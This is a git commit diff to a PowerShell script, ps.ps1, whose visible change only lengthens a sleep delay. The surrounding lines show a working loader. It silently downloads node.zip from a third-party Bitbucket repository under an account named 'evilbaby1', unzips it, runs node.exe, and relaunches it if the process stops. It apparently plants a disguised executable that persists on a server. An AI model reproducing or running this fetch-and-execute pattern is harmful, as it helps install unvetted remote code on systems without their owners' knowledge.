846928ee8d3cf1a4effb1d75efcb69662f50d3e6
evilbabylx <40205448+evilbabylx@users.noreply.github.com>
2019-07-15 10:02:58 +0700

    Update ps.ps1

--- ps.ps1
+++ ps.ps1
@@ -3,7 +3,7 @@ $ProgressPreference = "SilentlyContinue"
 $null | Invoke-WebRequest -UseBasicParsing -Uri "https://bitbucket.org/evilbaby1/openai/downloads/node.zip" -OutFile "D:\home\node.zip" > $null
 unzip node.zip
 Start-Process -FilePath "d:\home\node.exe" 
-Start-Sleep -s 10
+Start-Sleep -s 30
 if((get-process "node" -ea SilentlyContinue) -eq $Null){ 
         "Not Running" 
        Start-Process -FilePath "d:\home\node.exe" 
